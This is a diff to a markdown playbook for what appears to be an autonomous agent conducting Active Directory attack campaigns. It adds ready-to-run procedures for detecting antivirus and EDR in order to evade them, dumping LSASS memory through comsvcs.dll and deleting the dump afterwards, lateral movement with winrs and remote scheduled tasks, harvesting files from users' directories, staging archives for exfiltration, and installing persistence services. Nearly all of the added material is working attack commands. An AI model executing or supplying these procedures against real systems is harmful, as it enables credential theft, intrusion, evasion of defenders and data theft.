@@ -63,6 +63,18 @@ impacket is pure Python and runs natively on Windows; Kali is not required. Ever
 | `rbcd` | `rbcd.py` | `impacket-rbcd` |
 | `smbpasswd` | `smbpasswd.py` | `impacket-smbpasswd` |
 
+Additional tools used by the extended techniques:
+
+| Tool | Used by | Invocation (PATH-independent) |
+|------|---------|-------------------------------|
+| `bloodhound` (bloodhound-python) | `discovery.bloodhound` | `python -m bloodhound -c All -u <user> -p <pw> -d <domain> -ns <dc-ip> --dns-tcp` (install: `pip install bloodhound`) |
+| `comsvcs.dll` (built-in) | `credential.lsass-dump` | `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> <out> full` |
+| `winrs` (built-in) | `lateral.exec-winrm` | `winrs -r:<fqdn> -u:<domain>\<user> -p:<pw> "cmd /c <cmd>"` |
+| `schtasks` (built-in) | `lateral.exec-schtasks` | `schtasks /create /s <ip> /u <user> /p <pw> /tn <name> /tr <cmd> /sc once ...` |
+| `sc` (built-in) | `persistence.service` | `sc create <name> binPath= "<cmd>" start= auto` (via remote shell) |
+| `tar` / `Compress-Archive` (built-in) | `collection.archive` | `tar -cf ...` or `powershell -c "Compress-Archive ..."` |
+| `pypykatz` / `mimikatz` (offline) | `credential.lsass-dump` parse | operator step, not an attack action |
+
 On Windows, run any impacket script with one of these equivalent forms (flags are identical on every platform):
 
 ```
@@ -247,6 +259,7 @@ The state file is divided into three knowledge partitions (`domain`, `hosts`, `u
 | `password_policy` | Domain password/lockout policy (see shape below) |
 | `trusts[]` | Domain/forest trust relationships (see shape below) |
 | `rbcd[]` | Resource-based constrained delegation edges (see shape below) |
+| `security_products[]` | Antivirus/EDR product names discovered by `discovery.security-software` |
 | `updated_at` | Last modification time |
 
 `domain.dcs[]` item shape:
@@ -367,6 +380,8 @@ Attacker-owned/decided values that are not discovered facts:
 | `tools_dir` | Local directory that holds attacker tools (relative to the skill root or absolute) |
 | `tools[]` | Local tool filenames used by `lateral.tool-transfer` (e.g. `mimikatz.exe`) |
 | `local_admin_account.name` / `password` | Account the agent uses for local elevation on the attack host (Local Elevation Protocol): shape `{"name": "<account>", "password": "<password>"}`. Operator-preseeded as a fallback; the agent also records the account it actually elevated with so later elevations reuse it. |
+| `local_admins[]` | Members of the local Administrators group discovered by `discovery.local-groups` (feeds the Local Elevation Protocol and host privilege mapping) |
+| `staging_dir` | Local directory where collected data is staged and archived by `collection.archive` |
 
 ### 6. Runtime sections
 
@@ -462,6 +477,54 @@ python scripts/state.py add domain.dcs '{"fqdn": "<dc-fqdn>", "ip": "<dc-ip>", "
 - `nltest /dclist:<domain>` lists **every** DC. Record each one with its own `add domain.dcs` entry (mark the PDC `is_pdc: true`), and set the singular `dc_ip`/`dc_fqdn` to the primary (PDC) so `-dc-ip` targets resolve.
 - Derive `domain_sid` from `whoami /user`: take the user SID and drop the trailing RID (the part after the last `-`).
 - This is information gathering, not an attack action, so no capture brackets are required.
+
+## 0.2 Security Software Discovery
+
+- Technique id: `discovery.security-software`
+- ATT&CK: T1518.001 (Security Software Discovery)
+
+Purpose: identify antivirus/EDR products on the attack host so later actions can avoid detection.
+
+Inputs: none (local foothold context).
+
+Procedure (one atomic action):
+
+```
+powershell -c "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | Format-List"
+powershell -c "Get-MpComputerStatus | Select-Object AMRunningMode,RealTimeProtectionEnabled | Format-List"
+```
+
+Outputs: record the discovered products:
+
+```
+python scripts/state.py set domain.security_products '["<product1>", "<product2>"]'
+```
+
+Rollback: not applicable (re-run if the defensive stack changes).
+
+## 0.3 Local Group Enumeration
+
+- Technique id: `discovery.local-groups`
+- ATT&CK: T1069.001 (Permission Groups Discovery: Local Groups)
+
+Purpose: enumerate local groups and the local Administrators membership (feeds the Local Elevation Protocol and host privilege mapping).
+
+Inputs: none (local context).
+
+Procedure (one atomic action):
+
+```
+net localgroup
+net localgroup administrators
+```
+
+Outputs: record the discovered administrators:
+
+```
+python scripts/state.py set campaign.local_admins '["<account1>", "<account2>"]'
+```
+
+Rollback: re-run if local membership changes.
 
 ---
 
@@ -722,6 +785,29 @@ python scripts/state.py merge hosts[<index>] '{"fqdn": "<host>.<domain.name>", "
 
 Rollback: if the FQDN/machine account no longer resolves, `mark-stale` the host object and re-run this technique.
 
+## 1.11 BloodHound Domain Mapping
+
+- Technique id: `discovery.bloodhound`
+- ATT&CK: T1087.002 (Account Discovery: Domain Account), T1482 (Domain Trust Discovery)
+
+Purpose: collect domain objects, GPOs, ACLs, and attack paths over LDAP (BloodHound collection method).
+
+Inputs: `domain.name`, `domain.dc_ip`, and a user object with `password` from `users`. Requires the `bloodhound` tool (installed via `pip install bloodhound`; runs as `python -m bloodhound`). If the tool is missing, record the missing capability in `notes` and skip this technique.
+
+Procedure (one atomic action):
+
+```
+python -m bloodhound -c All -u <user> -p <password> -d <domain.name> -ns <domain.dc_ip> --dns-tcp
+```
+
+Outputs: record the produced JSON bundle:
+
+```
+python scripts/state.py add files '{"path": "<timestamp>_bloodhound.zip", "description": "BloodHound collection data"}'
+```
+
+Rollback: re-run if the collection is incomplete or stale.
+
 ---
 
 # Phase 2: Credential Access
@@ -924,6 +1010,34 @@ python scripts/state.py add users '{"username": "<user>", "password": "<decrypte
 ```
 
 Rollback: if a GPP credential is later rejected, `mark-stale` the user object and re-run this technique.
+
+## 2.9 LSASS Memory Dump
+
+- Technique id: `credential.lsass-dump`
+- ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory)
+
+Purpose: dump the LSASS process memory from a compromised host to recover credentials offline.
+
+Inputs: an admin user object with `password` from `users`, plus the target host.
+
+Procedure (one atomic action — locate LSASS, dump via comsvcs.dll, then download):
+
+```
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'powershell -c "Get-Process lsass | Select-Object -ExpandProperty Id"'
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass-pid> C:\windows\temp\lsass.dmp full'
+```
+
+Download and clean up with `smbclient`: `use C$`, `get windows\temp\lsass.dmp`, then `del windows\temp\lsass.dmp`, `exit`.
+
+Offline parsing is an operator step, not an attack action: `pypykatz lsa minidump lsass.dmp` (or mimikatz `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`).
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "lsass.dmp", "description": "LSASS memory dump from <target-ip>"}'
+```
+
+Rollback: if the dump yields nothing usable, `mark-stale` the file entry and re-dump with a fresh admin credential.
 
 ---
 
@@ -1222,6 +1336,46 @@ python scripts/state.py add files '{"path": "\\\\<host>\\<share>\\<tool>", "desc
 
 Rollback: if the share is unavailable, `mark-stale` the host object and re-run `discovery.share-enum`.
 
+## 3.14 Remote Shell (WinRM)
+
+- Technique id: `lateral.exec-winrm`
+- ATT&CK: T1021.006 (Remote Services: Windows Remote Management)
+
+Purpose: run a command on a target over WinRM (port 5985/5986) with plaintext credentials.
+
+Inputs: a user object with `password` from `users`, plus the target host.
+
+Procedure (one atomic action):
+
+```
+winrs -r:<target-fqdn> -u:<domain.name>\<user> -p:<password> "cmd /c whoami"
+```
+
+Outputs: mark the host `compromised`; record any files of interest under `files`.
+
+Rollback: if WinRM is disabled/unreachable, `mark-stale` the host and re-run `discovery.port-scan`.
+
+## 3.15 Remote Scheduled Task
+
+- Technique id: `lateral.exec-schtasks`
+- ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
+
+Purpose: create and run a scheduled task on a target to execute a command with plaintext credentials.
+
+Inputs: a user object with `password` from `users`, the target host, and the command to run.
+
+Procedure (one atomic action — create, run, then delete):
+
+```
+schtasks /create /s <target-ip> /u <domain.name>\<user> /p <password> /tn "<attacker-task>" /tr "cmd /c <command>" /sc once /st 00:00 /f
+schtasks /run /s <target-ip> /u <domain.name>\<user> /p <password> /tn "<attacker-task>"
+schtasks /delete /s <target-ip> /u <domain.name>\<user> /p <password> /tn "<attacker-task>" /f
+```
+
+Outputs: mark the host `compromised`; record any files of interest under `files`.
+
+Rollback: if task creation is denied, `mark-stale` the host and re-run `discovery.port-scan`.
+
 ---
 
 # Phase 4: Collection
@@ -1250,6 +1404,60 @@ python scripts/state.py add files '{"path": "<local-download-path>", "descriptio
 ```
 
 Rollback: if the file is gone or the share changed, `mark-stale` the host object and re-run `discovery.share-enum`.
+
+## 4.2 Local File Collection
+
+- Technique id: `collection.local-file`
+- ATT&CK: T1005 (Data from Local System)
+
+Purpose: enumerate and retrieve files of interest from a compromised host's local filesystem.
+
+Inputs: a user object with `password` from `users`, plus the target host.
+
+Procedure (one atomic action — list via remote shell, then download):
+
+```
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'dir /s /b C:\Users'
+```
+
+Then use `smbclient` (`use C$`) to `get` the chosen file.
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "<local-download-path>", "description": "collected from <target-ip> <remote-path>"}'
+```
+
+Rollback: if a file moves, `mark-stale` the entry and re-run.
+
+## 4.3 Archive Collected Data
+
+- Technique id: `collection.archive`
+- ATT&CK: T1560 (Archive Collected Data), T1560.001 (Archive via Utility)
+
+Purpose: stage and compress collected files for exfiltration.
+
+Inputs: files already recorded in `files[]` (or staged under `campaign.staging_dir`).
+
+Procedure (one atomic action):
+
+```
+tar -cf <campaign.staging_dir>/collected.tar -C <campaign.staging_dir> <files...>
+```
+
+or
+
+```
+powershell -c "Compress-Archive -Path <campaign.staging_dir>\* -DestinationPath <campaign.staging_dir>\collected.zip"
+```
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "<campaign.staging_dir>/collected.tar", "description": "staged archive of collected data"}'
+```
+
+Rollback: re-run after adding or removing staged files.
 
 ---
 
@@ -1399,6 +1607,30 @@ python scripts/changes.py add '{"kind": "reset_password", "technique_id": "persi
 ```
 
 Rollback: if the reset is later reverted, `mark-stale` the user object and re-run.
+
+## 5.6 Windows Service Persistence
+
+- Technique id: `persistence.service`
+- ATT&CK: T1543.003 (Create or Modify System Process: Windows Service)
+
+Purpose: install a new Windows service on a compromised host for persistence. This creates a host-local service and does **not** modify any existing AD account (allowed by the domain mutation constraints); record it in `changes.json`.
+
+Inputs: an admin user object with `password` from `users`, the target host, and the service command.
+
+Procedure (one atomic action):
+
+```
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'sc create <svc-name> binPath= "cmd /c <command>" start= auto'
+```
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "<svc-name>", "description": "persistence service on <target-ip>"}'
+python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.service", "target": "<target-ip>", "summary": "Created service <svc-name> on <target-ip>", "reversal": "sc \\\\<target-ip> delete <svc-name>"}'
+```
+
+Rollback: if the service is removed, `mark-stale` the file entry and re-create.
 
 ---
 
